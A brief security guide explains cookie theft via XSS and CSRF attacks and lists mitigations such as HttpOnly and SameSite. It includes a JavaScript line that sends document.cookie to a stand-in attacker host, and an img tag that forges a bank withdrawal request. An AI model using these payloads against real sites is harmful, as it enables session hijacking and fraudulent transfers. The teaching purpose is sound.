# Cookies Security

## Session hijacking and XSS

Cookies that identify a user and their authenticated session, when stolen, can lead to hijacking the authenticated user's session.

Cookies can be stolen by exploiting XSS vulnerability in the application with the following code:
```javascript
(new Image()).src = "http://www.cookie-monster.com/steal-cookie?cookie=" + document.cookie;
```

To mitigate this attack:
* use `HttpOnly` directive;
* filter the user input.

## Cross-site request forgery (CSRF)

Example of CSRF:
1. Someone includes an image that isn't really an image in an unfiltered chat of forum:
```html
<img src="http://bank.example.com/withdraw?account=bob&amount=10000&for=mallory">
```
2. This is a request to bank's server to withdraw money.
3. If you are logged into your bank account, your cookies are still valid and there is no confirmation of withdrawal, an money will be transferred.

To mitigate this attack:
* filter the user input;
* perform confirmation of any sensitive actions;
* use `sameSite=strict` and short lifetime for sensitive actions.
